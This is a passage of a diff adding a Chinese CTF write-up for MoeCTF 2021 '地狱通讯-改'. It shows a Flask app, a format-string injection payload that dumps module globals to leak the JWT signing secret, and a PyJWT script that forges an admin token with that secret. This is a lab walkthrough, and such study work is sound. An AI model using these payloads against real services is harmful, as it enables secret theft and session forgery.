@@ -77,3 +77,95 @@ if __name__ == "__main__":
 打开得到的html文件，可以看到如下内容：
 
 ![](./img/DUO-4.png)
+
+
+## [MoeCTF 2021]地狱通讯-改
+* 考点：JWT，ssti
+* 工具：yakit
+
+通过网页源码可以看出有一个简单的逻辑会给我们cookie，然后并且明确说这个cookie是jwt加密的，并且只要payload中的name字段为admin，那么就能够得到flag
+```py
+from flask import Flask, render_template, request, session, redirect, make_response
+from secret import secret, headers, User
+import datetime
+import jwt
+
+app = Flask(__name__)
+
+
+@app.route("/", methods=['GET', 'POST'])
+def index():
+    f = open("app.py", "r")
+    ctx = f.read()
+    f.close()
+    res = make_response(ctx)
+    name = request.args.get('name') or ''
+    if 'admin' in name or name == '':
+        return res
+    payload = {
+        "name": name,
+    }
+    token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
+    res.set_cookie('token', token)
+    return res
+
+
+@app.route('/hello', methods=['GET', 'POST'])
+def hello():
+    token = request.cookies.get('token')
+    if not token:
+        return redirect('/', 302)
+    try:
+        name = jwt.decode(token, secret, algorithms=['HS256'])['name']
+    except jwt.exceptions.InvalidSignatureError as e:
+        return "Invalid token"
+    if name != "admin":
+        user = User(name)
+        flag = request.args.get('flag') or ''
+        message = "Hello {0}, your flag is" + flag
+        return message.format(user)
+    else:
+        return render_template('flag.html', name=name)
+
+
+if __name__ == "__main__":
+    app.run()
+```
+
+这里由于网页会将通过flag变量传入的参数打印回来，所以可以理解为是一个ssti注入漏洞，直接回显了模块级全局字典，其中就有我们需要的secret key
+所以构造payload：
+```sh
+/hello?flag={0.__class__.__init__.__globals__}
+```
+
+![](./img/地狱通讯-1.png)
+
+然后通过下面的脚本实现获取新的jwt：
+
+```py
+import jwt              # pip install pyjwt
+import datetime
+
+secret  = "u_have_kn0w_what_f0rmat_i5"
+payload = {
+    "name":  "admin",                    # 想伪造的字段
+    "iat":   datetime.datetime.utcnow(), # 签发时间（可选）
+    "exp":   datetime.datetime.utcnow() + datetime.timedelta(hours=1)  # 失效时间（可选）
+}
+
+# 明确指定同服务器一致的算法
+token = jwt.encode(
+    payload,
+    key=secret,
+    algorithm="HS256",
+    headers={"typ": "JWT", "alg": "HS256"}   # 可省略，pyjwt 会自动生成
+)
+
+print(token)      # PyJWT 2.x 默认返回 str，1.x 返回 bytes
+
+```
+替换cookie得到flag
+
+![](./img/地狱通讯-2.png)
+
+---
